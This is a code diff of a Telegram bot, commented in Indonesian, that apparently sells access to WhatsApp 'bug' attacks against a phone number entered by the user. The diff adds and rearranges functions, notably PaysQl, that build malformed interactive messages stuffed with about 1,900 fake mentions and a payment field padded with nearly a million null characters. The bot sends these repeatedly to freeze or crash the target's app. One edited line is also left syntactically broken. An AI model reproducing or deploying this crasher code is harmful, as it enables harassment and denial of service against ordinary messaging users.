@@ -16,7 +16,7 @@
   
   if (module.parent !== null && module.parent !== undefined) {
     console.error('\n[!] SECURITY ALERT: Terdeteksi parent module')
-    console.error('[!] Parent: ' + module.parent.filename)
+    console.error('[!] Pareparent.filename)
     console.error('[!] Akses ditolak - Process dihentikan\n')
     
     try { process.exit(1) } catch(e) {}
@@ -757,7 +757,7 @@ const startSesi = async () => {
 ///////////////////////////////////////////////////
 const checkWhatsAppConnection = (ctx, next) => {
   if (!isWhatsAppConnected) {
-    return ctx.reply("❌ WhatsApp belum connect, /connect dulu");
+    return ctx.reply("🪧 Sender tidak terhubung, Silahkan /addbot terlebih dahulu untuk Menghubungkan sender kembali");
   }
   return next();
 };
@@ -1184,28 +1184,50 @@ bot.action("xsettings", async (ctx) => {
 ◇ System    : Auto-Update
 ◇ Language  : JavaScript
 ◇ Framework : Telegraf
-<blockquote>☾. ⬡═―⊱「 ⚙️ XSETTINGS MENU 」⊰―═⬡ ࣪ ִֶָ☾.</blockquote>
-◇ /update
-◇ /connect
-◇ /addprem
-◇ /delprem
-◇ /addadmin
-◇ /deladmin
-◇ /addgrouppremium
-◇ /delgrouppremium
-◇ /setcd
-◇ /anticulik
-◇ /addsafe
-◇ /delsafe
-◇ /self
-◇ /public
-◇ /groupon
-◇ /groupoff
-◇ /antifoto
-◇ /antivideo
-◇ /runtime
-◇ /mode
-◇ /cekowner
+╭═───⊱<strong>⚙️ XSETTINGS MENU</strong>───═⬡
+│ ⸙ /update 
+│ ᯓ➤ Auto Update Script (Only Owner Acces)
+│ ⸙ /addbot 62xxxx
+│ ᯓ➤ Add sender Number
+│ ⸙ /addprem
+│ ᯓ➤ Add Premium Acces User
+│ ⸙ /delprem
+│ ᯓ➤ Delete Premium Acces User
+│ ⸙ /addadmin
+│ ᯓ➤ Add Admin Acces User 
+│ ⸙ /deladmin
+│ ᯓ➤ Delete Admin Acces User
+│ ⸙ /addgrouppremium
+│ ᯓ➤ Add Premium Group
+│ ⸙ /delgrouppremium
+│ ᯓ➤ Delete Premium Group
+│ ⸙ /setcd
+│ ᯓ➤ Setting Cooldown Command Bugs
+│ ⸙ /anticulik
+│ ᯓ➤ Anti Culik Bot To Unknown Groups
+│ ⸙ /addsafe
+│ ᯓ➤ Forget It
+│ ⸙ /delsafe
+│ᯓ➤ Can Be Accessed By Anyone
+│ ⸙ /self
+│ ᯓ➤ Owner Only Mode
+│ ⸙ /public
+│ ᯓ➤ Bot Public Can Acces All User
+│ ⸙ /groupon
+│ ᯓ➤ Mode Group On
+│ ⸙ /groupoff
+│ ᯓ➤ Mode Group Off
+│ ⸙ /antifoto 
+│ ᯓ➤ Block Send Foto
+│ ⸙ /antivideo
+│ ᯓ➤ Block Send Video
+│ ⸙ /runtime
+│ ᯓ➤ Check Run How long Script
+│ ⸙ /mode
+│ ᯓ➤ Mode Bot On/Off
+│ ⸙ /cekowner
+│ ᯓ➤ Check Id Owner
+╰═─────────────═⬡
 <blockquote>ִֶָ࣪☾. ( ! ) 𝚂𝚎𝚕𝚕𝚎𝚌𝚝 𝚃𝚑𝚎 𝙼𝚎𝚗𝚞 𝙱𝚞𝚝𝚝𝚘𝚗 𝙱𝚎𝚕𝚘𝚠 ࣪ ִֶָ☾.</blockquote>
 `;
 
@@ -2182,7 +2204,7 @@ bot.command("connect", checkOwner, async (ctx) => {
 
     const args = ctx.message.text.split(" ");
     if (args.length < 2) {
-      return ctx.reply("Example:\n/connect 628xxxx");
+      return ctx.reply("Example:\n/addbot 628xxxx");
     }
 
     let phoneNumber = args[1].replace(/[^0-9]/g, "");
@@ -2194,7 +2216,7 @@ bot.command("connect", checkOwner, async (ctx) => {
 
     
     if (phoneNumber.length < 8 || phoneNumber.length > 15) {
-      return ctx.reply("❌ Nomor tidak valid.\nGunakan kode negara.\n\nExample:\n/connect 628xxxx");
+      return ctx.reply("❌ Nomor tidak valid.\nGunakan kode negara.\n\nExample:\n/addbot 628xxxx");
     }
 
     await new Promise(r => setTimeout(r, 1000));
@@ -2252,7 +2274,7 @@ bot.command("killsesi", checkOwner, async (ctx) => {
     global.pairingMessage = null;
 
     if (deleted) {
-      ctx.reply("🗑️ Session dihapus, silakan /connect ulang");
+      ctx.reply("🗑️ Session dihapus, silakan /addbot kembali");
     } else {
       ctx.reply("⚠️ Session tidak ditemukan");
     }
@@ -2295,14 +2317,17 @@ bot.command("Xbug", checkAllPremium, checkWhatsAppConnection, checkCooldown, asy
 `<pre>🛡️ 𝐗𝐛𝐮𝐠𝐬 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧 𝐀𝐭𝐭𝐚𝐜𝐤𝐢𝐧𝐠
  ━━━━━━━━━━━━━━━
 ◇ 📤 Target : ${q}
-◇ 🦋 Type : DILEY LOW
+◇ 🦋 Type : DILEY CAN SPAM
 ◇ ⚡ Status : Success✅
-◇ 🚀 Process : Berhasil Yeay✅</pre>`,
+◇ ⚙️ Command : Xbug
+◇ 🚀 Information : Berhasil Yeay🥳</pre>`,
     { parse_mode: "HTML" }
   );
 
   (async () => {
     for (let i = 0; i < 20; i++) {
+      await DelayInvis (sock, target);
+      await sleep(2000);
       await PaysQl(sock, target);
       await sleep(1500);
     }
@@ -2505,55 +2530,6 @@ async function ArTdElay(sock, target) {
   await new Promise(resolve => setTimeout(resolve, 5000));
 }
 
-async function PaysQl(socket, target) {
-  const msg = await generateWAMessageFromContent(
-    target,
-    {
-      viewOnceMessage: {
-        message: {
-          interactiveResponseMessage: {
-            contextInfo: {
-              remoteJid: " X ",
-              mentionedJid: Array.from({ length: 1900 }, () =>
-                `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
-              )
-            },
-            body: {
-              text: " @vinzxiterr ",
-              format: "DEFAULT"
-            },
-            nativeFlowResponseMessage: {
-              name: "payment_info",
-              paramsJson: `{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"4UJPSC1FYKC","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"¿!deadcode!¿","key":" ¿🎭? ${"\u0000".repeat(999999)}","key_type":"CPF"}}],"share_payment_status":false}`,
-              version: 3
-            }
-          }
-        }
-      }
-    },
-    {
-      participant: { jid: target }
-    }
-  )
-
-  for (let i = 0; i < 20; i++) {
-    await client.relayMessage(
-      target,
-      {
-        groupStatusMessageV2: {
-          message: msg.message
-        }
-      },
-      {
-        messageId: msg.key.id,
-        participant: { jid: target }
-      }
-    )
-
-    await sleep(1500)
-  }
-}
-
 async function DelayInvis(sock, target) {
   const type = ["galaxy_message", "call_permission_request", "address_message", "payment_method", "mpm"];
   
@@ -2617,6 +2593,55 @@ async function DelayInvis(sock, target) {
       
       await new Promise(resolve => setTimeout(resolve, 3000));
     }
+  }
+}
+
+async function PaysQl(socket, target) {
+  const msg = await generateWAMessageFromContent(
+    target,
+    {
+      viewOnceMessage: {
+        message: {
+          interactiveResponseMessage: {
+            contextInfo: {
+              remoteJid: " X ",
+              mentionedJid: Array.from({ length: 1900 }, () =>
+                `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
+              )
+            },
+            body: {
+              text: " @vinzxiterr ",
+              format: "DEFAULT"
+            },
+            nativeFlowResponseMessage: {
+              name: "payment_info",
+              paramsJson: `{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"4UJPSC1FYKC","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"¿!deadcode!¿","key":" ¿🎭? ${"\u0000".repeat(999999)}","key_type":"CPF"}}],"share_payment_status":false}`,
+              version: 3
+            }
+          }
+        }
+      }
+    },
+    {
+      participant: { jid: target }
+    }
+  )
+
+  for (let i = 0; i < 20; i++) {
+    await client.relayMessage(
+      target,
+      {
+        groupStatusMessageV2: {
+          message: msg.message
+        }
+      },
+      {
+        messageId: msg.key.id,
+        participant: { jid: target }
+      }
+    )
+
+    await sleep(1500)
   }
 }
 
